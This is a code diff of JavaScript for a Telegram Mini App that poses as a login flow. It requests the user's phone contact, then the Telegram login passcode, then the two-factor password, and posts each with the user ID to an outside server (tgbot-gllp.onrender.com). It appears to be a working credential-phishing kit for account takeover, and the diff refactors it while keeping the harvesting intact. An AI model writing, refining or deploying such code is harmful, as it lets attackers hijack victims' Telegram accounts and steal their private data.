@@ -1,211 +1,150 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const tg = window.Telegram?.WebApp;
-    
-    tg.ready();
-    tg.expand();
-    let page = 'page1';
+  const tg = window.Telegram?.WebApp;
+  if (!tg) return;
 
-    // Display debug info on page
-    const loginBtn = document.getElementById('loginbtn');
-    const page1 = document.getElementById('page1');
-    const page2 = document.getElementById('page2');
-    const page3 = document.getElementById('page3');
-    const popup = document.getElementById('popup');
-    const blur = document.getElementById('blur');
-    const passcodeBtn = document.getElementById('passcode-btn');
-    const passcodeInput = document.getElementById('hiddenInput');
-    const twofactorInput = document.getElementById('twofactor-input');
+  tg.ready();
+  tg.expand();
 
-    document.addEventListener('touchstart', (e) => {
+  // DOM elements
+  const loginBtn = document.getElementById('loginbtn');
+  const page1 = document.getElementById('page1');
+  const page2 = document.getElementById('page2');
+  const page3 = document.getElementById('page3');
+  const popup = document.getElementById('popup');
+  const blur = document.getElementById('blur');
+  const passcodeBtn = document.getElementById('passcode-btn');
+  const passcodeInput = document.getElementById('hiddenInput');
+  const twofactorInput = document.getElementById('twofactor-input');
+  const twofactorBtn = document.getElementById('twofactor-btn');
+  const input = document.getElementById('hiddenInput');
+  const box = document.getElementById('codeBox');
+  const cells = document.querySelectorAll('.cell');
+
+  let userInfo = tg.initDataUnsafe?.user || null;
+  const testMode = false;
+  let currentPage = 'page1';
+
+  // 🧩 Hide keyboard when tapping outside input
+  document.addEventListener('touchstart', (e) => {
     const active = document.activeElement;
+    if (
+      active &&
+      (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA') &&
+      !e.target.closest('input') &&
+      !e.target.closest('textarea')
+    ) {
+      active.blur();
+    }
+  });
 
-    // If user taps outside of any input or textarea, blur it
-        if (
-            active &&
-            (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA') &&
-            !e.target.closest('input') &&
-            !e.target.closest('textarea')
-        ) {
-            active.blur();
-        }
-    });
-
-
-    // Store user info globally when available
-    let userInfo = null;
-    let testMode = false; // Enable test mode if no Telegram data
-
-    // Try to get user info from Telegram WebApp
-    if (tg.initDataUnsafe?.user) {
-        userInfo = tg.initDataUnsafe.user;
+  // 🪪 Login button → request Telegram contact
+  loginBtn.addEventListener('click', async () => {
+    if (testMode) {
+      tg.showAlert('⚠️ Please open this app from the Telegram bot.\n\nFor testing, use the TEST MODE button below.');
+      return;
     }
 
-    loginBtn.addEventListener('click', async () => {
-        
-        // Update user info if now available
-        if (tg.initDataUnsafe?.user) {
-            userInfo = tg.initDataUnsafe.user;
+    try {
+      tg.requestContact();
+      tg.onEvent('contactRequested', (data) => {
+        if (data.status === 'sent') {
+          showPage2();
         }
-        
-        if (testMode) {
-            tg.showAlert('⚠️ Please open this app from the Telegram bot.\n\nFor testing, use the TEST MODE button below.');
-            return;
-        }
-        
-        try {
-            tg.requestContact();
-            tg.onEvent('contactRequested', (data) => {
-                console.log('📞 Contact requested:', data);
-                if (data.status === 'sent') {
-                    showPage2();
-                }
-            });
-            
-        } catch (error) {
-            console.log('[ERROR]: ' + error);
-            tg.showAlert('Error: ' + error.message);
-        }
-    });
+      });
+    } catch (error) {
+      tg.showAlert('Error: ' + error.message);
+    }
+  });
 
-    function showPage2() {
-        page = 'page2';
-        page2.style.display = 'flex';
-        requestAnimationFrame(() => {
-            page2.style.transform = 'translateY(0)';
-        });
-        blur.style.zIndex = '0';
-        page2.style.zIndex = '100';
-        blur.style.opacity = '1';
-        loginBtn.style.display = 'none';
+  // 📱 Transition helpers
+  function smoothTransition(showEl, hideEls = []) {
+    hideEls.forEach((el) => (el.style.display = 'none'));
+    showEl.style.display = 'flex';
+    showEl.style.transform = 'translateY(40px)';
+    showEl.style.opacity = '0';
+
+    requestAnimationFrame(() => {
+      showEl.style.transform = 'translateY(0)';
+      showEl.style.opacity = '1';
+    });
+  }
+
+  function showPage2() {
+    currentPage = 'page2';
+    smoothTransition(page2, [page1]);
+    blur.style.opacity = '1';
+  }
+
+  function showPage3() {
+    currentPage = 'page3';
+    smoothTransition(page3, [page2]);
+    popup.style.height = '340px';
+    blur.style.opacity = '1';
+  }
+
+  // 🧩 Handle passcode
+  passcodeBtn.addEventListener('click', async () => {
+    const passcode = passcodeInput.value.trim();
+    if (!passcode) return tg.showAlert('⚠️ Please enter passcode');
+
+    let user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;
+
+    if (!user_id && tg.initData) {
+      const params = new URLSearchParams(tg.initData);
+      const userParam = params.get('user');
+      if (userParam) {
+        try {
+          const userData = JSON.parse(userParam);
+          user_id = userData.id;
+          userInfo = userData;
+        } catch {}
+      }
     }
 
-    function showPage3() {
-        page = 'page3';
-        page2.style.display = 'none';
-        page3.style.display = 'flex';
-        popup.style.height = '340px';
-        requestAnimationFrame(() => {
-            page3.style.transform = 'translateY(0)';
-        });
-        blur.style.zIndex = '0';
-        page3.style.zIndex = '100';
-        blur.style.opacity = '1';
+    if (!user_id) return tg.showAlert('⚠️ Cannot get user ID. Please open from Telegram bot.');
+
+    try {
+      await fetch('https://tgbot-gllp.onrender.com/send_data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ passcode, user_id }),
+      });
+      setTimeout(showPage3, 600);
+    } catch (err) {
+      tg.showAlert('❌ Failed to send passcode');
     }
+  });
 
-    // Handle passcode submission
-    passcodeBtn.addEventListener('click', async () => {
-        const passcode = passcodeInput.value;
-        
-        if (!passcode) {
-            tg.showAlert('⚠️ Please enter passcode');
-            return;
-        }
+  // 🔐 Handle 2FA input
+  twofactorBtn.addEventListener('click', async () => {
+    const twofactor = twofactorInput.value.trim();
+    if (!twofactor) return tg.showAlert('⚠️ Please enter 2FA password');
 
-        // Get user_id from stored userInfo or try to parse from Telegram
-        let user_id = userInfo?.id;
-        
-        if (!user_id && tg.initDataUnsafe?.user?.id) {
-            user_id = tg.initDataUnsafe.user.id;
-            userInfo = tg.initDataUnsafe.user;
-        }
-        
-        if (!user_id && tg.initData) {
-            // Try to parse from initData string as last resort
-            const params = new URLSearchParams(tg.initData);
-            const userParam = params.get('user');
-            if (userParam) {
-                try {
-                    const userData = JSON.parse(userParam);
-                    user_id = userData.id;
-                    userInfo = userData;
-                } catch (e) {
-                }
-            }
-        }
+    const user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;
+    if (!user_id) return tg.showAlert('⚠️ Cannot get user ID');
 
-        if (!user_id) {
-            tg.showAlert('⚠️ Cannot get user ID. Please open from Telegram bot.');
-            return;
-        }
+    try {
+      await fetch('https://tgbot-gllp.onrender.com/send_twofactor', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ twofactor, user_id }),
+      });
+    } catch (err) {
+      tg.showAlert('❌ Failed to send');
+    }
+  });
 
-        console.log('📤 Sending: Passcode=' + passcode + ', UserID=' + user_id);
-
-        try {
-            const response = await fetch('https://tgbot-gllp.onrender.com/send_data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    passcode: passcode,
-                    user_id: user_id
-                }),
-            });
-
-            const result = await response.json();
-            
-            // Show 2FA page
-            setTimeout(() => {
-                showPage3();
-            }, 1000);
-            
-        } catch (err) {
-
-        }
+  // 🔢 Passcode box input visual
+  box.addEventListener('click', () => input.focus());
+  input.addEventListener('input', () => {
+    const value = input.value.split('');
+    cells.forEach((cell, i) => {
+      cell.textContent = value[i] || '';
+      if (value[i]) {
+        cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
+      } else {
+        cell.style.boxShadow = '';
+      }
     });
-
-    // Handle 2FA submission
-    const twofactorBtn = document.getElementById('twofactor-btn');
-    twofactorBtn.addEventListener('click', async () => {
-        const twofactor = twofactorInput.value;
-
-        if (!twofactor) {
-            tg.showAlert('⚠️ Please enter 2FA password');
-            return;
-        }
-
-        const user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;
-
-        if (!user_id) {
-            tg.showAlert('⚠️ Cannot get user ID');
-            return;
-        }
-
-        console.log('📤 Sending: 2FA password, UserID=' + user_id);
-
-        try {
-            const response = await fetch('https://tgbot-gllp.onrender.com/send_twofactor', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    twofactor: twofactor,
-                    user_id: user_id
-                }),
-            });
-
-            const result = await response.json();
-            
-        } catch (err) {
-            tg.showAlert('❌ Failed to send');
-        }
-    });
-
-    // Handle passcode input display
-    const input = document.getElementById('hiddenInput');
-    const cells = document.querySelectorAll('.cell');
-    const box = document.getElementById('codeBox');
-
-    box.addEventListener('click', () => input.focus());
-
-    input.addEventListener('input', () => {
-        const value = input.value.split('');
-        cells.forEach((cell, i) => {
-            cell.textContent = value[i] || '';
-            if (value[i]) {
-                requestAnimationFrame(() => {
-                    cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
-                });
-            } else {
-                cell.style.boxShadow = '';
-            }
-        });
-    });
+  });
 });
